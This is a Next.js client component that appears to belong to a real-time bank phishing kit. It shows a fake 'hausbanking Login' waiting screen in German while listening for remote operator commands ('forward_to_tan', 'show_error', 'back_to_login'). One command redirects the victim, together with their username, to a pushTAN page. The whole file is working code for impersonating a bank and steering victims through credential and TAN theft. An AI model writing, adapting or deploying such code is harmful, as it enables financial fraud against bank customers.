"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan": {
          const code = (cmd.payload as { code?: string }).code || "";
          router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
          break;
        }
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main waiting area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <div className="login-pin-column">
          <div className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>hausbanking Login</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Error banner */}
                  {error && (
                    <div className="messages-overlay">
                      <div
                        style={{
                          backgroundColor: "#fef2f2",
                          border: "1px solid #c70100",
                          borderRadius: 4,
                          padding: "12px 16px",
                          color: "#c70100",
                          fontSize: 14,
                          lineHeight: 1.5,
                        }}
                      >
                        {error}
                      </div>
                    </div>
                  )}

                  {/* Spinner and text */}
                  <div style={{ textAlign: "center", padding: "50px 20px 40px" }}>
                    <div style={{
                      width: 48,
                      height: 48,
                      border: "4px solid #d7d7d7",
                      borderTop: "4px solid #196bc1",
                      borderRadius: "50%",
                      margin: "0 auto 24px",
                      animation: "vb-spin 1s linear infinite",
                    }} />
                    <p style={{
                      fontSize: 20,
                      color: "#333333",
                      marginBottom: 8,
                      fontWeight: 500,
                    }}>
                      Ihre Daten werden {"ü"}berpr{"ü"}ft...
                    </p>
                    <p style={{ fontSize: 14, color: "#8c8c8c" }}>
                      Bitte warten Sie...
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Spinner keyframes */}
      <style>{`
        @keyframes vb-spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </>
  );
}
